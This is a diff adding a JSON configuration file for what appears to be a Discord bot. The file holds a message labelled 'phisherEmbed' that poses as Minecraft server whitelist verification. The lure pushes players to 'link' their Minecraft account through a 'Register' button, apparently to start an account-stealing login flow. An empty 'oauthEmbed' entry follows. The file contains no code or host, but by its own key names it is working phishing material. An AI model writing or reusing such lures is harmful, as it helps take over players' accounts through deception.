@@ -1,0 +1,12 @@
+{
+    "default": {
+        "phisherEmbed":{
+            "title": "MINECRAFT Verification",
+            "description": "Welcome, adventurers of our Minecraft SMP! To ensure a smooth and secure experience for everyone, we require all players to link their Minecraft account with our Discord bot. This step is crucial for getting whitelisted and joining our world!\n\n**Why do i have to link my Minecraft account?**\n\n**Whitelist Access : Linking is necessary to verify your identity and grant you access to the server.**\n**Community Safety** : It helps us maintain a safe and friendly environment by ensuring only verified members can join.\n**Event Participation** : Get notified about server events, special challenges, and more, all linked to your account!\nSupport & Assistance : Linking makes it easier for us to assist you with any in-game issues or concerns.\n\n🔗 How to Link Your Account 🔗\nClick the button below to start the linking process.\nFollow the simple instructions to verify your Minecraft account.\nOnce linked, you'll be added to the whitelist and ready to jump into the adventure!\n\nIf you have any problem verifying feel free to dm the owners or create a support ticket !",
+            "buttonLabel": "Register"
+        },
+        "oauthEmbed":{
+            "title":""
+        }
+    }
+}
